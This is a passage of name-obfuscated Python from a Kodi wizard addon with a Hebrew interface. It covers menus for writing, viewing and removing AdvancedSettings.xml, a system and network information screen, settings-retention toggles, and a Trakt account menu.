		else :#line:3500
			OO00OOO00OOOO0OOO =wiz .workingURL (url )#line:3501
			OOOO00000OO000OO0 =url #line:3502
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3503
		if os .path .exists (ADVANCED ):#line:3504
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:3505
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3506
		if OO00OOO00OOOO0OOO ==True :#line:3507
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:3508
			OOO0O00OO0OOOO0O0 =wiz .openURL (OOOO00000OO000OO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:3509
			O00O0O00OOO0O00OO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OOO0O00OO0OOOO0O0 )#line:3510
			if len (O00O0O00OOO0O00OO )>0 :#line:3511
				for O0O00OO00000O00OO ,O0O000OOOO0OO000O ,url ,OOO00O00O0OO0O00O ,O0OO0O00O00000OOO ,OOOOOOOOO0OO0000O in O00O0O00OOO0O00OO :#line:3512
					if O0O000OOOO0OO000O .lower ()=="yes":#line:3513
						addDir ("[B]%s[/B]"%O0O00OO00000O00OO ,'advancedsetting',url ,description =OOOOOOOOO0OO0000O ,icon =OOO00O00O0OO0O00O ,fanart =O0OO0O00O00000OOO ,themeit =THEME3 )#line:3514
					else :#line:3515
						addFile (O0O00OO00000O00OO ,'writeadvanced',O0O00OO00000O00OO ,url ,description =OOOOOOOOO0OO0000O ,icon =OOO00O00O0OO0O00O ,fanart =O0OO0O00O00000OOO ,themeit =THEME2 )#line:3516
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:3517
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OO00OOO00OOOO0OOO )#line:3518
	else :wiz .log ("[Advanced Settings] not Enabled")#line:3519
def writeAdvanced (OO0OOOO0O0000O0O0 ,OO0OO0O00OOO0O0O0 ):#line:3521
	O00O0O0O0OO000000 =wiz .workingURL (OO0OO0O00OOO0O0O0 )#line:3522
	if O00O0O0O0OO000000 ==True :#line:3523
		if os .path .exists (ADVANCED ):O0O00OOOO0OO00OOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO0OOOO0O0000O0O0 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:3524
		else :O0O00OOOO0OO00OOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO0OOOO0O0000O0O0 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:3525
		if O0O00OOOO0OO00OOO ==1 :#line:3527
			OO0O00000000O00O0 =wiz .openURL (OO0OO0O00OOO0O0O0 )#line:3528
			OO00000OOOOOO000O =open (ADVANCED ,'w');#line:3529
			OO00000OOOOOO000O .write (OO0O00000000O00O0 )#line:3530
			OO00000OOOOOO000O .close ()#line:3531
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:3532
			wiz .killxbmc (True )#line:3533
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:3534
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O00O0O0O0OO000000 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:3535
def viewAdvanced ():#line:3537
	OOO00O000OOO0000O =open (ADVANCED )#line:3538
	O0OOO0OO00O00OOOO =OOO00O000OOO0000O .read ().replace ('\t','    ')#line:3539
	wiz .TextBox (ADDONTITLE ,O0OOO0OO00O00OOOO )#line:3540
	OOO00O000OOO0000O .close ()#line:3541
def removeAdvanced ():#line:3543
	if os .path .exists (ADVANCED ):#line:3544
		wiz .removeFile (ADVANCED )#line:3545
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:3546
def showAutoAdvanced ():#line:3548
	notify .autoConfig ()#line:3549
def getIP ():#line:3551
	O0O0OOO00O0OOO00O ='http://whatismyipaddress.com/'#line:3552
	if not wiz .workingURL (O0O0OOO00O0OOO00O ):return 'Unknown','Unknown','Unknown'#line:3553
	OOO00OOO0O00O00O0 =wiz .openURL (O0O0OOO00O0OOO00O ).replace ('\n','').replace ('\r','')#line:3554
	if not 'Access Denied'in OOO00OOO0O00O00O0 :#line:3555
		OO00OO0OO00O0OOO0 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OOO00OOO0O00O00O0 )#line:3556
		O0OOO0000O00OOO00 =OO00OO0OO00O0OOO0 [0 ]if (len (OO00OO0OO00O0OOO0 )>0 )else 'Unknown'#line:3557
		OOO000O00OOOOOOO0 =re .compile ('"font-size:14px;">(.+?)</td>').findall (OOO00OOO0O00O00O0 )#line:3558
		OOO0O0OOOOOO000OO =OOO000O00OOOOOOO0 [0 ]if (len (OOO000O00OOOOOOO0 )>0 )else 'Unknown'#line:3559
		OO000OOO00000OO0O =OOO000O00OOOOOOO0 [1 ]+', '+OOO000O00OOOOOOO0 [2 ]+', '+OOO000O00OOOOOOO0 [3 ]if (len (OOO000O00OOOOOOO0 )>2 )else 'Unknown'#line:3560
		return O0OOO0000O00OOO00 ,OOO0O0OOOOOO000OO ,OO000OOO00000OO0O #line:3561
	else :return 'Unknown','Unknown','Unknown'#line:3562
def systemInfo ():#line:3564
	O0O0O00000O00OO00 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:3578
	OO000O0OO0OO00OO0 =[];O000OOO0OO00O00O0 =0 #line:3579
	for OOO00OO0O000O00O0 in O0O0O00000O00OO00 :#line:3580
		O0O000O00O0O000O0 =wiz .getInfo (OOO00OO0O000O00O0 )#line:3581
		OOOO00O00OOOO0O00 =0 #line:3582
		while O0O000O00O0O000O0 =="Busy"and OOOO00O00OOOO0O00 <10 :#line:3583
			O0O000O00O0O000O0 =wiz .getInfo (OOO00OO0O000O00O0 );OOOO00O00OOOO0O00 +=1 ;wiz .log ("%s sleep %s"%(OOO00OO0O000O00O0 ,str (OOOO00O00OOOO0O00 )));xbmc .sleep (1000 )#line:3584
		OO000O0OO0OO00OO0 .append (O0O000O00O0O000O0 )#line:3585
		O000OOO0OO00O00O0 +=1 #line:3586
	OOO0OOOO00OOO000O =OO000O0OO0OO00OO0 [8 ]if 'Una'in OO000O0OO0OO00OO0 [8 ]else wiz .convertSize (int (float (OO000O0OO0OO00OO0 [8 ][:-8 ]))*1024 *1024 )#line:3587
	OO00O0OOO00OO00OO =OO000O0OO0OO00OO0 [9 ]if 'Una'in OO000O0OO0OO00OO0 [9 ]else wiz .convertSize (int (float (OO000O0OO0OO00OO0 [9 ][:-8 ]))*1024 *1024 )#line:3588
	OO0O00OO000OOOOO0 =OO000O0OO0OO00OO0 [10 ]if 'Una'in OO000O0OO0OO00OO0 [10 ]else wiz .convertSize (int (float (OO000O0OO0OO00OO0 [10 ][:-8 ]))*1024 *1024 )#line:3589
	O00OO0O00O0O0OO00 =wiz .convertSize (int (float (OO000O0OO0OO00OO0 [11 ][:-2 ]))*1024 *1024 )#line:3590
	OO00OOOO0O000OOOO =wiz .convertSize (int (float (OO000O0OO0OO00OO0 [12 ][:-2 ]))*1024 *1024 )#line:3591
	O0O0OO00O00O0OOO0 =wiz .convertSize (int (float (OO000O0OO0OO00OO0 [13 ][:-2 ]))*1024 *1024 )#line:3592
	OO0O0O0O0OO0O0OO0 ,O0OOOO00O0O0O0O0O ,OOOO00O0O0O000OOO =getIP ()#line:3593
	OO0OO0OO0OO00OO00 =[];OO0O00OOO00O0O000 =[];OO0O000000O000O00 =[];O00OO00O0OOOOO000 =[];O0O0OOO0000OOO000 =[];OO0OO00OOO00000O0 =[];OO0O0OOO0O0000OO0 =[]#line:3595
	O0OO0OOOOOO00O00O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3597
	for OO00OOOOOO000O0O0 in sorted (O0OO0OOOOOO00O00O ,key =lambda O000OOOOOOO00OO00 :O000OOOOOOO00OO00 ):#line:3598
		OO00O0O000O00O00O =os .path .split (OO00OOOOOO000O0O0 [:-1 ])[1 ]#line:3599
		if OO00O0O000O00O00O =='packages':continue #line:3600
		OO0OOO0OO00OOO0OO =os .path .join (OO00OOOOOO000O0O0 ,'addon.xml')#line:3601
		if os .path .exists (OO0OOO0OO00OOO0OO ):#line:3602
			O000OO00O0O000000 =open (OO0OOO0OO00OOO0OO )#line:3603
			O000O0O0OO000OO00 =O000OO00O0O000000 .read ()#line:3604
			OO0OOOOO000O000OO =re .compile ("<provides>(.+?)</provides>").findall (O000O0O0OO000OO00 )#line:3605
			if len (OO0OOOOO000O000OO )==0 :#line:3606
				if OO00O0O000O00O00O .startswith ('skin'):OO0O0OOO0O0000OO0 .append (OO00O0O000O00O00O )#line:3607
				if OO00O0O000O00O00O .startswith ('repo'):O0O0OOO0000OOO000 .append (OO00O0O000O00O00O )#line:3608
				else :OO0OO00OOO00000O0 .append (OO00O0O000O00O00O )#line:3609
			elif not (OO0OOOOO000O000OO [0 ]).find ('executable')==-1 :O00OO00O0OOOOO000 .append (OO00O0O000O00O00O )#line:3610
			elif not (OO0OOOOO000O000OO [0 ]).find ('video')==-1 :OO0O000000O000O00 .append (OO00O0O000O00O00O )#line:3611
			elif not (OO0OOOOO000O000OO [0 ]).find ('audio')==-1 :OO0O00OOO00O0O000 .append (OO00O0O000O00O00O )#line:3612
			elif not (OO0OOOOO000O000OO [0 ]).find ('image')==-1 :OO0OO0OO0OO00OO00 .append (OO00O0O000O00O00O )#line:3613
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3615
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O0OO0OO00OO0 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3616
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O0OO0OO00OO0 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3617
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3618
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O0OO0OO00OO0 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3619
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O0OO0OO00OO0 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3620
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3622
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O0OO0OO00OO0 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3623
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O0OO0OO00OO0 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3624
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3626
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OOOO00OOO000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3627
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0OOO00OO00OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3628
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O00OO000OOOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3629
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3631
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OO0O00O0O0OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3632
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OOOO0O000OOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3633
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OO00O00O0OOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3634
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3636
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O0OO0OO00OO0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3637
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0O0O0OO0O0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3638
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOOO00O0O0O0O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3639
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO00O0O0O000OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3640
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O0OO0OO00OO0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3641
	O0O0O0O0OOO0O00O0 =len (OO0OO0OO0OO00OO00 )+len (OO0O00OOO00O0O000 )+len (OO0O000000O000O00 )+len (O00OO00O0OOOOO000 )+len (OO0OO00OOO00000O0 )+len (OO0O0OOO0O0000OO0 )+len (O0O0OOO0000OOO000 )#line:3643
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,O0O0O0O0OOO0O00O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3644
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0O000000O000O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3645
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00OO00O0OOOOO000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3646
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0O00OOO00O0O000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3647
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0OO0OO0OO00OO00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3648
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0OOO0000OOO000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3649
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0O0OOO0O0000OO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3650
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0OO00OOO00000O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3651
def Menu ():#line:3652
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3653
def saveMenu ():#line:3655
	O00O00OOO0O0OOO0O ='[COLOR yellow]מופעל[/COLOR]';O0OOOOOOOO00O000O ='[COLOR blue]מבוטל[/COLOR]'#line:3657
	OO0O0OO000OOOO00O ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3658
	OOO00O0O00O0O00OO ='true'if KEEPMOVIELIST =='true'else 'false'#line:3659
	OO0O0O00O0OOOO0OO ='true'if KEEPINFO =='true'else 'false'#line:3660
	OO0O00O00O0OOOOOO ='true'if KEEPSOUND =='true'else 'false'#line:3662
	O0000O0O000000O00 ='true'if KEEPVIEW =='true'else 'false'#line:3663
	O0OO0OOO00000OOO0 ='true'if KEEPSKIN =='true'else 'false'#line:3664
	O0O0OO0O000OOOOO0 ='true'if KEEPSKIN2 =='true'else 'false'#line:3665
	O0O0000O0OOO0O0OO ='true'if KEEPSKIN3 =='true'else 'false'#line:3666
	OOO0O00OOOO0OOO0O ='true'if KEEPADDONS =='true'else 'false'#line:3667
	O0OOOO0O0O000O000 ='true'if KEEPPVR =='true'else 'false'#line:3668
	OO00OO0O00OO0000O ='true'if KEEPTVLIST =='true'else 'false'#line:3669
	O000000O00OO0000O ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3670
	O000OOOO0000OOO00 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3671
	OOOOO00OO00000000 ='true'if KEEPHUBTV =='true'else 'false'#line:3672
	OOOOO0O0OO0OOO000 ='true'if KEEPHUBVOD =='true'else 'false'#line:3673
	O0OO0O0000000000O ='true'if KEEPHUBSPORT =='true'else 'false'#line:3674
	OOO0OO0OO0O0OOO00 ='true'if KEEPHUBKIDS =='true'else 'false'#line:3675
	O00OOO0OO0OOO0OO0 ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3676
	O0O0O00O000000O0O ='true'if KEEPHUBMENU =='true'else 'false'#line:3677
	O0O0O0OO00O0OOOO0 ='true'if KEEPPLAYLIST =='true'else 'false'#line:3678
	OO00O0OOOOOO000O0 ='true'if KEEPTRAKT =='true'else 'false'#line:3679
	OO0O00O0O0O00000O ='true'if KEEPREAL =='true'else 'false'#line:3680
	OOO00OO0OOOO0OOOO ='true'if KEEPRD2 =='true'else 'false'#line:3681
	O00O0OO00OO00000O ='true'if KEEPTORNET =='true'else 'true'#line:3682
	OOO00O0OO0O00OOOO ='true'if KEEPLOGIN =='true'else 'false'#line:3683
	O0000OOOO00OO0OO0 ='true'if KEEPSOURCES =='true'else 'false'#line:3684
	OOOO00O0OO000OO00 ='true'if KEEPADVANCED =='true'else 'false'#line:3685
	OO00OOOOO0OO0O0OO ='true'if KEEPPROFILES =='true'else 'false'#line:3686
	O00OOOOOOOO0O00O0 ='true'if KEEPFAVS =='true'else 'false'#line:3687
	O00O0O0OOOO0OOOO0 ='true'if KEEPREPOS =='true'else 'false'#line:3688
	O0O00000000O00OOO ='true'if KEEPSUPER =='true'else 'false'#line:3689
	O000O0OO000O000O0 ='true'if KEEPWHITELIST =='true'else 'false'#line:3690
	OO0OO000O000OOO0O ='true'if KEEPWEATHER =='true'else 'false'#line:3691
	O0O0000O00000OO0O ='true'if KEEPVICTORY =='true'else 'false'#line:3692
	OOO0O0OOO0O0OO0O0 ='true'if KEEPTELEMEDIA =='true'else 'false'#line:3693
	if O000O0OO000O000O0 =='true':#line:3695
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3696
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3697
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3698
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3699
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3700
	addFile ('%s שמירת חשבון RD:  '%OO0O00O0O0O00000O .replace ('true',O00O00OOO0O0OOO0O ).replace ('false',O0OOOOOOOO00O000O ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3703
	addFile ('%s שמירת חשבון טראקט:  '%OO00O0OOOOOO000O0 .replace ('true',O00O00OOO0O0OOO0O ).replace ('false',O0OOOOOOOO00O000O ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3704
	addFile ('%s שמירת מועדפים:  '%O00OOOOOOOO0O00O0 .replace ('true',O00O00OOO0O0OOO0O ).replace ('false',O0OOOOOOOO00O000O ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3707
	addFile ('%s שמירת לקוח טלוויזיה:  '%O0OOOO0O0O000O000 .replace ('true',O00O00OOO0O0OOO0O ).replace ('false',O0OOOOOOOO00O000O ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3708
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%O0O0000O00000OO0O .replace ('true',O00O00OOO0O0OOO0O ).replace ('false',O0OOOOOOOO00O000O ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:3709
	addFile ('%s שמירת חשבון טלמדיה:  '%OOO0O0OOO0O0OO0O0 .replace ('true',O00O00OOO0O0OOO0O ).replace ('false',O0OOOOOOOO00O000O ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:3710
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%OO00OO0O00OO0000O .replace ('true',O00O00OOO0O0OOO0O ).replace ('false',O0OOOOOOOO00O000O ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3711
	addFile ('%s שמירת אריח סרטים:  '%O000000O00OO0000O .replace ('true',O00O00OOO0O0OOO0O ).replace ('false',O0OOOOOOOO00O000O ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3712
	addFile ('%s שמירת אריח סדרות:  '%O000OOOO0000OOO00 .replace ('true',O00O00OOO0O0OOO0O ).replace ('false',O0OOOOOOOO00O000O ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3713
	addFile ('%s שמירת אריח טלויזיה:  '%OOOOO00OO00000000 .replace ('true',O00O00OOO0O0OOO0O ).replace ('false',O0OOOOOOOO00O000O ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3714
	addFile ('%s שמירת אריח תוכן ישראלי:  '%OOOOO0O0OO0OOO000 .replace ('true',O00O00OOO0O0OOO0O ).replace ('false',O0OOOOOOOO00O000O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3715
	addFile ('%s שמירת אריח ספורט:  '%O0OO0O0000000000O .replace ('true',O00O00OOO0O0OOO0O ).replace ('false',O0OOOOOOOO00O000O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3716
	addFile ('%s שמירת אריח ילדים:  '%OOO0OO0OO0O0OOO00 .replace ('true',O00O00OOO0O0OOO0O ).replace ('false',O0OOOOOOOO00O000O ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3717
	addFile ('%s שמירת אריח מוסיקה:  '%O00OOO0OO0OOO0OO0 .replace ('true',O00O00OOO0O0OOO0O ).replace ('false',O0OOOOOOOO00O000O ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3718
	addFile ('%s שמירת תפריט אריחים ראשי:  '%O0O0O00O000000O0O .replace ('true',O00O00OOO0O0OOO0O ).replace ('false',O0OOOOOOOO00O000O ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3719
	addFile ('%s שמירת כל האריחים בסקין:  '%O0OO0OOO00000OOO0 .replace ('true',O00O00OOO0O0OOO0O ).replace ('false',O0OOOOOOOO00O000O ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3720
	addFile ('%s שמירת הגדרות מזג האוויר:  '%OO0OO000O000OOO0O .replace ('true',O00O00OOO0O0OOO0O ).replace ('false',O0OOOOOOOO00O000O ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3721
	addFile ('%s שמירת הרחבות שהתקנתי:  '%OOO0O00OOOO0OOO0O .replace ('true',O00O00OOO0O0OOO0O ).replace ('false',O0OOOOOOOO00O000O ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3727
	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%OO0O0O00O0OOOO0OO .replace ('true',O00O00OOO0O0OOO0O ).replace ('false',O0OOOOOOOO00O000O ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3728
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%OOO00O0O00O0O00OO .replace ('true',O00O00OOO0O0OOO0O ).replace ('false',O0OOOOOOOO00O000O ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3731
	addFile ('%s שמירת נתיבי ספריות וידאו:  '%O0000OOOO00OO0OO0 .replace ('true',O00O00OOO0O0OOO0O ).replace ('false',O0OOOOOOOO00O000O ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3732
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%OO0O00O00O0OOOOOO .replace ('true',O00O00OOO0O0OOO0O ).replace ('false',O0OOOOOOOO00O000O ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3733
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%O0000O0O000000O00 .replace ('true',O00O00OOO0O0OOO0O ).replace ('false',O0OOOOOOOO00O000O ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3735
	addFile ('%s שמירת פליליסט לאודר:  '%O0O0O0OO00O0OOOO0 .replace ('true',O00O00OOO0O0OOO0O ).replace ('false',O0OOOOOOOO00O000O ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3736
	addFile ('%s שמירת הגדרות באפר: '%OOOO00O0OO000OO00 .replace ('true',O00O00OOO0O0OOO0O ).replace ('false',O0OOOOOOOO00O000O ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3741
	addFile ('%s שמירת רשימות ריפו:  '%O00O0O0OOOO0OOOO0 .replace ('true',O00O00OOO0O0OOO0O ).replace ('false',O0OOOOOOOO00O000O ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3743
	setView ('files','viewType')#line:3745
def traktMenu ():#line:3747
	O0O000O000OOO0OO0 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3748
	OO000O0O0OOO0OOOO =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3749
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3750
	addFile ('Save Trakt Data: %s'%O0O000O000OOO0OO0 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3751
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (OO000O0O0OOO0OOOO ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3752
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3753
	for O0O000O000OOO0OO0 in traktit .ORDER :#line:3755
		O0O000000O00O0O00 =TRAKTID [O0O000O000OOO0OO0 ]['name']#line:3756
		OOO000000O000OOO0 =TRAKTID [O0O000O000OOO0OO0 ]['path']#line:3757
		OOOOO00OOOOO0OOO0 =TRAKTID [O0O000O000OOO0OO0 ]['saved']#line:3758
		O00OOO0OO00O00OOO =TRAKTID [O0O000O000OOO0OO0 ]['file']#line:3759
		O0O0O0OOO0OO0O000 =wiz .getS (OOOOO00OOOOO0OOO0 )#line:3760
		OO00O0OO0OO00O0OO =traktit .traktUser (O0O000O000OOO0OO0 )#line:3761
		OOOO0O0O0O0OOO00O =TRAKTID [O0O000O000OOO0OO0 ]['icon']if os .path .exists (OOO000000O000OOO0 )else ICONTRAKT #line:3762
		OO0O0O0OO000O0O0O =TRAKTID [O0O000O000OOO0OO0 ]['fanart']if os .path .exists (OOO000000O000OOO0 )else FANART #line:3763
		OOO0OOO0O0OOO0O0O =createMenu ('saveaddon','Trakt',O0O000O000OOO0OO0 )#line:3764
